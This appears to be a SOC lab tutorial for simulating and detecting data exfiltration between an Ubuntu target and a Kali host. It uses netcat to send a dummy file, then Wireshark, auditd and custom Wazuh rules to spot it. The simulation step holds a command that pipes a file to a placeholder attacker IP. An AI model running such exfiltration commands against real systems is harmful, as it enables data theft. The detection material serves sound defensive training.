# Data Exfiltration Detection 

Data exfiltration detection, which is a classic scenario in threat hunting and SOC operations. Since you have Ubuntu as the target machine, Kali Linux (for simulating attacks), and Wazuh SIEM, here's a step-by-step practical guide to simulate and detect data exfiltration.

# 🎯 Objective
Simulate an attacker exfiltrating data from the Ubuntu target to Kali Linux (acting as a remote server), and detect the behavior using network logs, Wireshark, and Wazuh.

**🧰 Tools Used**

**Netcat (nc)** – for file transfer

**Wireshark** – to capture and analyze packets

**Wazuh** – to monitor logs and generate alerts

# Step-by-Step Lab Simulation
 **Step 1: Prepare File to Exfiltrate (on Ubuntu)**
 
  Create a dummy sensitive file:

    echo "Top Secret Data - Do Not Share" > ~/secret.txt

**Step 2: Start Netcat Listener (on Kali Linux)**

Choose a non-standard port (e.g., 4444):

    nc -lvp 4444 > received_data.txt

Step 3: Transfer File from Ubuntu (simulate exfiltration)

    nc <kali-ip> 4444 < ~/secret.txt

This sends secret.txt from Ubuntu to Kali.

**Step 4: Capture the Exfiltration with Wireshark (on Ubuntu or Kali)**

Start Wireshark on the correct interface.

    Apply filter: tcp.port == 4444

Observe the transfer of secret.txt content.

**Step 5: Detect with Wazuh SIEM**

  **Option A: Enable Sysmon for Linux (advanced logging)**

   Use Wazuh's Syscollector or Auditd to monitor:

-> Process execution (nc)

-> Network connections

**Option B: Use auditd rules to monitor netcat or large outbound traffic
Add auditd rule (on Ubuntu):**

    sudo auditctl -a always,exit -F arch=b64 -S connect -F dir=out -k netcat_exfil

Ensure **/var/log/audit/audit.log** is being monitored by Wazuh:

In **/var/ossec/etc/ossec.conf:**

    xml
    
    <localfile>
      <log_format>audit</log_format>
      <location>/var/log/audit/audit.log</location>
    </localfile>

**Restart Wazuh agent:**

    sudo systemctl restart wazuh-agent

📜 Step 6: Wazuh Custom Rule for Data Exfiltration
On the Wazuh manager:

    sudo nano /var/ossec/etc/rules/local_rules.xml

**Example Rule:**

    xml
    
    <group name="exfiltration,netcat,suspicious">
      <rule id="100200" level="10">
        <decoded_as>json</decoded_as>
        <field name="process.name">nc</field>
        <description>Potential data exfiltration using Netcat</description>
        <mitre>
          <id>T1041</id> <!-- Exfiltration Over C2 Channel -->
          <id>T1048</id> <!-- Exfiltration Over Alternative Protocol -->
        </mitre>
      </rule>
    
      <rule id="100201" level="12">
        <decoded_as>json</decoded_as>
        <field name="destination.port">4444</field>
        <description>Outbound connection on non-standard port - possible exfiltration</description>
        <mitre>
          <id>T1041</id>
        </mitre>
      </rule>
    </group>

**Restart the Wazuh manager:**

    sudo systemctl restart wazuh-manager

**Step 7: Observe in Wazuh Dashboard**

Look for alerts with Rule ID 100200 or 100201.

Filter by command: nc


